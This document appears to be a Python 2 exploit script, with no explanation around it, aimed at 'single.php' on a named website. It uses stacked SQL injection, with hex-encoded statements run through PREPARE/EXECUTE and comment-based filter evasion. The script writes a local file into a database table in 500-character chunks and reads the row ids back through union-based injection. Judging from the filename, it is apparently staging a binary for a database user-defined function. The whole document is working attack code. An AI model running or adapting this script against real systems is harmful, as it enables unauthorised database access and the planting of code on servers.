import binascii 
import requests 
import re
# String len 
c = 500 
with open('udff.txt') as f:  
	for s in f:    
		content = [s[i:i+c] for i in xrange(0,len(s),c)]
regx = '<p class="m_4">(.*?)<\/p>'
flag = 1 
id_arr = []
for data in content:
# insert content  
	if flag:  
		expp = "INSERT INTO temp.temp (content) VALUES ('%s')" % data    
		url2 = "http://www.rootk.pw/single.php?id=0'union/**/select/**/1,(sele ct/**/id/**/from/**/temp.temp/**/where/**/content='{data}'/**/limit/**/0,1 );".format(data=data)
	else:    
		expp = "INSERT INTO temp.temp (content) VALUES (CONCAT((SELECT * from (select content as b from temp.temp where id='%s')B),'%s'))" % (temp_id,data)    
		url2 = "http://www.rootk.pw/single.php?id=0'union/**/select/**/1,(sele ct/**/id/**/from/**/temp.temp/**/where/**/content/**/like/**/'%25{data}%25 '/**/order/**/by/**/id/**/desc/**/limit/**/0,1);".format(data=data)    
		print url2  
	exp = binascii.b2a_hex(expp)
	url = "http://www.rootk.pw/single.php?id=1';SET/**/@SQL=0x%s;PREPARE/**/ pord/**/FROM/**/@SQL;EXECUTE/**/pord;" % exp  
	requests.get(url)
  # select id
	r1 = requests.get(url2)  
	m = re.search(regx,r1.content)
	if m.group(1):    
		temp_id = m.group(1)    
		id_arr.append(m.group(1))  
	else:    
		print 'Error.'  
	flag = 0 
print id_arr
